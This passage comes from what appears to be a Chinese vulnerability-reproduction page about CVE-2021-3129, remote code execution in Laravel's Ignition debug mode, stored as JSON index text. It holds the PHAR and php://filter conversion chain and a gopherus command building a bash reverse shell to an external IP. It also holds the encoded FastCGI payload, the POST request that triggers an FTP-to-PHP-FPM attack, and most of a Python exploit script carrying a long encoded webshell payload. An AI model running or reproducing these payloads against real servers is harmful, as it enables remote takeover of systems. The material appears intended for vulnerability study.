\u901a\u8fc7\u6211\u4eec\u7684\u8fc7\u6ee4\u5668\u5c06\u65e5\u5fd7\u6587\u4ef6\u8f6c\u6362\u4e3a\u6709\u6548\u7684PHAR\uff1a viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log \u542f\u52a8PHAR\u7684\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\uff1a viewFile: phar:///path/to/storage/logs/laravel.log","title":"\u4e0b\u9762\u662f\u6211\u4eec\u6700\u7ec8\u7684\u8f6c\u6362\u94fe\uff1a"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20%E5%B0%8F%E4%BA%8E%208.4.2%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129/#\u5229\u7528ftp\u4e0ephp-fpm\u8fdb\u884c\u4ea4\u4e92","text":"\u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u8fd0\u884cfile_get_contents\u6765\u67e5\u627e\u4efb\u4f55\u4e1c\u897f\uff0c\u56e0\u6b64\uff0c\u53ef\u4ee5\u901a\u8fc7\u53d1\u9001HTTP\u8bf7\u6c42\u6765\u626b\u63cf\u5e38\u7528\u7aef\u53e3\u3002\u7ed3\u679c\u53d1\u73b0\uff0cPHP-FPM\u4f3c\u4e4e\u6b63\u5728\u4fa6\u542c\u7aef\u53e39000\u3002 \u4f17\u6240\u5468\u77e5\uff0c\u5982\u679c\u6211\u4eec\u80fd\u5411PHP-FPM\u670d\u52a1\u53d1\u9001\u4e00\u4e2a\u4efb\u610f\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u5305\uff0c\u5c31\u53ef\u4ee5\u5728\u673a\u5668\u4e0a\u6267\u884c\u4ee3\u7801\u3002\u8fd9\u79cd\u6280\u672f\u7ecf\u5e38\u4e0egopher://\u534f\u8bae\u7ed3\u5408\u4f7f\u7528\uff0ccurl\u652f\u6301gopher://\u534f\u8bae\uff0c\u4f46PHP\u5374\u4e0d\u652f\u6301\u3002 \u53e6\u4e00\u4e2a\u5df2\u77e5\u7684\u5141\u8bb8\u901a\u8fc7TCP\u53d1\u9001\u4e8c\u8fdb\u5236\u6570\u636e\u5305\u7684\u534f\u8bae\u662fFTP\uff0c\u66f4\u51c6\u786e\u7684\u8bf4\u662f\u8be5\u534f\u8bae\u7684\u88ab\u52a8\u6a21\u5f0f\uff1a\u5982\u679c\u4e00\u4e2a\u5ba2\u6237\u7aef\u8bd5\u56fe\u4eceFTP\u670d\u52a1\u5668\u4e0a\u8bfb\u53d6\u4e00\u4e2a\u6587\u4ef6\uff08\u6216\u5199\u5165\uff09\uff0c\u670d\u52a1\u5668\u4f1a\u901a\u77e5\u5ba2\u6237\u7aef\u5c06\u6587\u4ef6\u7684\u5185\u5bb9\u8bfb\u53d6\uff08\u6216\u5199\uff09\u5230\u4e00\u4e2a\u7279\u5b9a\u7684IP\u548c\u7aef\u53e3\u4e0a\u3002\u800c\u4e14\uff0c\u8fd9\u91cc\u5bf9\u8fd9\u4e9bIP\u548c\u7aef\u53e3\u6ca1\u6709\u8fdb\u884c\u5fc5\u8981\u7684\u9650\u5236\u3002\u4f8b\u5982\uff0c\u670d\u52a1\u5668\u53ef\u4ee5\u544a\u8bc9\u5ba2\u6237\u7aef\u8fde\u63a5\u5230\u81ea\u5df1\u7684\u4e00\u4e2a\u7aef\u53e3\uff0c\u5982\u679c\u5b83\u613f\u610f\u7684\u8bdd\u3002 \u73b0\u5728\uff0c\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528viewFile= ftp://evil-server.lexfo.fr/file.txt\u6765\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e \uff0c\u4f1a\u53d1\u751f\u4ee5\u4e0b\u60c5\u51b5\uff1a file_get_contents()\u8fde\u63a5\u5230\u6211\u4eec\u7684FTP\u670d\u52a1\u5668\uff0c\u5e76\u4e0b\u8f7dfile.txt\u3002 file_put_contents()\u8fde\u63a5\u5230\u6211\u4eec\u7684FTP\u670d\u52a1\u5668\uff0c\u5e76\u5c06\u5176\u4e0a\u4f20\u56defile.txt\u3002 \u60a8\u53ef\u80fd\u5df2\u7ecf\u77e5\u9053\u8fd9\u662f\u600e\u4e48\u56de\u4e8b\uff1a\u6211\u4eec\u5c06\u4f7f\u7528FTP\u534f\u8bae\u7684\u88ab\u52a8\u6a21\u5f0f\u8ba9file_get_contents()\u5728\u6211\u4eec\u7684\u670d\u52a1\u5668\u4e0a\u4e0b\u8f7d\u4e00\u4e2a\u6587\u4ef6\uff0c\u5f53\u5b83\u8bd5\u56fe\u4f7f\u7528file_put_contents()\u628a\u5b83\u4e0a\u4f20\u56de\u53bb\u65f6\uff0c\u6211\u4eec\u5c06\u544a\u8bc9\u5b83\u628a\u6587\u4ef6\u53d1\u9001\u5230127.0.0.1:9000\u3002 \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5411PHP-FPM\u53d1\u9001\u4e00\u4e2a\u4efb\u610f\u7684\u6570\u636e\u5305\uff0c\u4ece\u800c\u6267\u884c\u4ee3\u7801\u3002 \u5229\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u5728\u6211\u4eec\u7684\u76ee\u6807\u4e0a\u6210\u529f\u5730\u5229\u7528\u4e86\u8be5\u6f0f\u6d1e\u3002 \u4e0b\u9762\u6211\u4eec\u6765\u6f14\u793a\u4e00\u4e0b\u653b\u51fb\u8fc7\u7a0b\u3002 \u9996\u5148\uff0c\u6211\u4eec\u4f7f\u7528gopherus\u751f\u6210\u653b\u51fbfastcgi\u7684payload\uff1a python gopherus.py --exploit fastcgi /var/www/public/index.php # \u8fd9\u91cc\u8f93\u5165\u7684\u662f\u76ee\u6807\u4e3b\u673a\u4e0a\u4e00\u4e2a\u5df2\u77e5\u5b58\u5728\u7684php\u6587\u4ef6 bash -c \"bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1\" # \u8fd9\u91cc\u8f93\u5165\u7684\u662f\u8981\u6267\u884c\u7684\u547d\u4ee4 \u5f97\u5230payload\uff0c\u800c\u6211\u4eec\u9700\u8981\u7684\u662f\u4e0a\u9762payload\u4e2d **_**\u540e\u9762\u7684\u6570\u636e\u90e8\u5206\uff0c\u5373\uff1a %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxx.xxx.xxx.xxx/9999%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 \u5c06\u6570\u636e\u6dfb\u52a0\u5230\u5982\u4e0b**FTP\u811a\u672c**\u4e2d\u7684payload(\u811a\u672c\u5728\u6587\u7ae0\u672b\u5c3e\u548c POC\u76ee\u5f55\u4e2d) \u76d1\u542c\u521a\u521a\u7684\u53cd\u5f39shell\u7aef\u53e3\u5e76\u8fd0\u884c FTP\u811a\u672c \u53d1\u9001\u8bf7\u6c42\u53cd\u5f39shell POST /_ig n i t io n /execu te - solu t io n HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx : 8888 Co ntent - Type : applica t io n /jso n Co ntent - Le n g t h : 191 { \"solution\" : \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"ftp://aaa@xxx.xxx.xxx.xxx:23/123\" } } [!NOTE] \u4f7f\u7528Docker\u73af\u5883\u65e0\u6cd5\u590d\u73b0\uff0c\u9700\u8981\u642d\u5efa\u53e6\u4e00\u4e2a\u73af\u5883","title":"\u5229\u7528FTP\u4e0ePHP-FPM\u8fdb\u884c\u4ea4\u4e92"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20%E5%B0%8F%E4%BA%8E%208.4.2%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129/#\u6f0f\u6d1e\u5229\u7528poc","text":"https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP/blob/main/laravel-CVE-2021-3129-EXP.py # -*- coding: utf-8 -*- import requests , json import sys , re proxies = { \"http\" : '127.0.0.1:8080' } header = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0\" , \"Content-Type\" : \"application/json\" } def clearlog ( url ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def AA ( url ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"AA\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def sendpayloadwindows ( url ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=2F=00=42=00=77=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6F=00=42=00=77=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4E=00=44=00=45=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=58=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=6C=00=63=00=33=00=4E=00=70=00=62=00=32=00=35=00=66=00=63=00=33=00=52=00=68=00=63=00=6E=00=51=00=6F=00=4B=00=54=00=74=00=41=00=63=00=32=00=56=00=30=00=58=00=33=00=52=00=70=00=62=00=57=00=56=00=66=00=62=00=47=00=6C=00=74=00=61=00=58=00=51=00=6F=00=4D=00=43=00=6B=00=37=00=51=00=47=00=56=00=79=00=63=00=6D=00=39=00=79=00=58=00=33=00=4A=00=6C=00=63=00=47=00=39=00=79=00=64=00=47=00=6C=00=75=00=5A=00=79=00=67=00=77=00=4B=00=54=00=74=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=46=00=4B=00=46=00=34=00=6B=00=52=00=43=00=78=00=65=00=4A=00=45=00=73=00=70=00=65=00=32=00=5A=00=76=00=63=00=69=00=68=00=65=00=4A=00=47=00=6B=00=39=00=4D=00=44=00=74=00=65=00=4A=00=47=00=6C=00=65=00=50=00=48=00=4E=00=30=00=63=00=6D=00=78=00=6C=00=62=00=69=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=31=00=34=00=6B=00=61=00=53=00=73=00=72=00=4B=00=53=00=42=00=37=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=30=00=67=00=50=00=53=00=42=00=65=00=4A=00=45=00=52=00=62=00=58=00=69=00=52=00=70=00=58=00=56=00=35=00=65=00=58=00=69=00=52=00=4C=00=57=00=31=00=34=00=6B=00=61=00=53=00=73=00=78=00=58=00=69=00=59=00=78=00=4E=00=56=00=30=00=37=00=66=00=58=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=65=00=4A=00=45=00=51=00=37=00=66=00=57=00=5A=00=31=00=62=00=6D=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=46=00=45=00=6F=00=58=00=69=00=52=00=45=00=4B=00=58=00=74=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=58=00=32=00=56=00=75=00=59=00=32=00=39=00=6B=00=5A=00=53=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=50=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6B=00=5A=00=57=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=58=00=69=00=52=00=51=00=50=00=53=00=64=00=77=00=59=00=58=00=4E=00=7A=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=59=00=39=00=4A=00=33=00=42=00=68=00=65=00=57=00=78=00=76=00=59=00=57=00=51=00=6E=00=4F=00=31=00=34=00=6B=00=56=00=44=00=30=00=6E=00=4D=00=32=00=4D=00=32=00=5A=00=54=00=42=00=69=00=4F=00=47=00=45=00=35=00=59=00=7A=00=45=00=31=00=4D=00=6A=00=49=00=30=00=59=00=53=00=63=00=37=00=61=00=57=00=59=00=67=00=4B=00=47=00=6C=00=7A=00=63=00=32=00=56=00=30=00=4B=00=46=00=34=00=6B=00=58=00=31=00=42=00=50=00=55=00=31=00=52=00=62=00=58=00=69=00=52=00=51=00=58=00=53=00=6B=00=70=00=65=00=31=00=34=00=6B=00=52=00=6A=00=31=00=50=00=4B=00=45=00=55=00=6F=00=54=00=79=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=77=00=39=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4F=00=31=00=34=00=6B=00=51=00=54=00=31=00=6C=00=65=00=48=00=42=00=73=00=62=00=32=00=52=00=6C=00=4B=00=43=00=64=00=65=00=66=00=43=00=63=00=73=00=58=00=69=00=52=00=4D=00=4B=00=54=00=74=00=6A=00=62=00=47=00=46=00=7A=00=63=00=79=00=42=00=44=00=65=00=33=00=42=00=31=00=59=00=6D=00=78=00=70=00=59=00=79=00=42=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=48=00=41=00=70=00=49=00=48=00=74=00=6C=00=64=00=6D=00=46=00=73=00=4B=00=46=00=34=00=6B=00=63=00=43=00=34=00=69=00=49=00=69=00=6B=00=37=00=66=00=58=00=31=00=65=00=4A=00=46=00=49=00=39=00=62=00=6D=00=56=00=33=00=49=00=45=00=4D=00=6F=00=4B=00=54=00=74=00=65=00=4A=00=46=00=49=00=74=00=58=00=6A=00=35=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=45=00=46=00=62=00=4D=00=46=00=30=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=77=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=45=00=6F=00=52=00=53=00=68=00=41=00=63=00=6E=00=56=00=75=00=4B=00=46=00=34=00=6B=00=52=00=69=00=6B=00=73=00=58=00=69=00=52=00=55=00=4B=00=53=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=7A=00=64=00=57=00=4A=00=7A=00=64=00=48=00=49=00=6F=00=62=00=57=00=51=00=31=00=4B=00=46=00=34=00=6B=00=55=00=43=00=35=00=65=00=4A=00=46=00=51=00=70=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=39=00=5A=00=57=00=78=00=7A=00=5A=00=58=00=74=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=39=00=58=00=69=00=52=00=47=00=4F=00=33=00=31=00=39=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=51=00=78=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=34=00=38=00=50=00=33=00=42=00=6F=00=63=00=43=00=42=00=7A=00=5A=00=58=00=4E=00=7A=00=61=00=57=00=39=00=75=00=58=00=33=00=4E=00=30=00=59=00=58=00=4A=00=30=00=4B=00=43=00=6B=00=37=00=51=00=48=00=4E=00=6C=00=64=00=46=00=39=00=30=00=61=00=57=00=31=00=6C=00=58=00=32=00=78=00=70=00=62=00=57=00=6C=00=30=00=4B=00=44=00=41=00=70=00=4F=00=30=00=42=00=6C=00=63=00=6E=00=4A=00=76=00=63=00=6C=00=39=00=79=00=5A=00=58=00=42=00=76=00=63=00=6E=00=52=00=70=00=62=00=6D=00=63=00=6F=00=4D=00=43=00=6B=00=37=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=52=00=53=00=68=00=65=00=4A=00=45=00=51=00=73=00=58=00=69=00=52=00=4C=00=4B=00=58=00=74=00=6D=00=62=00=33=00=49=00=6F=00=58=00=69=00=52=00=70=00=50=00=54=00=41=00=37=00=58=00=69=00=52=00=70=00=58=00=6A=00=78=00=7A=00=64=00=48=00=4A=00=73=00=5A=00=57=00=34=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4B=00=79=00=6B=00=67=00=65=00=31=00=34=00=6B=00=52=00=46=00=74=00=65=00=4A=00=47=00=6C=00=64=00=49=00=44=00=30=00=67=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=31=00=65=00=58=00=6C=00=34=00=6B=00=53=00=31=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4D=00=56=00=34=00=6D=00=4D=00=54=00=56=00=64=00=4F=00=33=00=31=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=58=00=69=00=52=00=45=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=52=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6C=00=62=00=6D=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=54=00=79=00=68=00=65=00=4A=00=45=00=51=00=70=00=65=00=33=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=69=00=59=00=58=00=4E=00=6C=00=4E=00=6A=00=52=00=66=00=5A=00=47=00=56=00=6A=00=62=00=32=00=52=00=6C=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6B=00=37=00=66=00=56=00=34=00=6B=00=55=00=44=00=30=00=6E=00=63=00=47=00=46=00=7A=00=63=00=79=00=63=00=37=00=58=00=69=00=52=00=57=00=50=00=53=00=64=00=77=00=59=00=58=00=6C=00=73=00=62=00=32=00=46=00=6B=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=51=00=39=00=4A=00=7A=00=4E=00=6A=00=4E=00=6D=00=55=00=77=00=59=00=6A=00=68=00=68=00=4F=00=57=00=4D=00=78=00=4E=00=54=00=49=00=79=00=4E=00=47=00=45=00=6E=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=59=00=39=00=54=00=79=00=68=00=46=00=4B=00=45=00=38=00=6F=00=58=00=69=00=52=00=66=00=55=00=45=00=39=00=54=00=56=00=46=00=74=00=65=00=4A=00=46=00=42=00=64=00=4B=00=53=00=78=00=65=00=4A=00=46=00=51=00=70=00=4B=00=54=00=74=00=70=00=5A=00=69=00=41=00=6F=00=61=00=58=00=4E=00=7A=00=5A=00=58=00=51=00=6F=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4B=00=53=00=6C=00=37=00=58=00=69=00=52=00=4D=00=50=00=56=00=34=00=6B=00=58=00=31=00=4E=00=46=00=55=00=31=00=4E=00=4A=00=54=00=30=00=35=00=62=00=58=00=69=00=52=00=57=00=58=00=54=00=74=00=65=00=4A=00=45=00=45=00=39=00=5A=00=58=00=68=00=77=00=62=00=47=00=39=00=6B=00=5A=00=53=00=67=00=6E=00=58=00=6E=00=77=00=6E=00=4C=00=46=00=34=00=6B=00=54=00=43=00=6B=00=37=00=59=00=32=00=78=00=68=00=63=00=33=00=4D=00=67=00=51=00=33=00=74=00=77=00=64=00=57=00=4A=00=73=00=61=00=57=00=4D=00=67=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=77=00=4B=00=53=00=42=00=37=00=5A=00=58=00=5A=00=68=00=62=00=43=00=68=00=65=00=4A=00=48=00=41=00=75=00=49=00=69=00=49=00=70=00=4F=00=33=00=31=00=39=00=58=00=69=00=52=00=53=00=50=00=57=00=35=00=6C=00=64=00=79=00=42=00=44=00=4B=00=43=00=6B=00=37=00=58=00=69=00=52=00=53=00=4C=00=56=00=34=00=2B=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=42=00=57=00=7A=00=42=00=64=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=48=00=4E=00=31=00=59=00=6E=00=4E=00=30=00=63=00=69=00=68=00=74=00=5A=00=44=00=55=00=6F=00=58=00=69=00=52=00=51=00=4C=00=6C=00=34=00=6B=00=56=00=43=00=6B=00=73=00=4D=00=43=00=77=00=78=00=4E=00=69=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=52=00=4B=00=45=00=55=00=6F=00=51=00=48=00=4A=0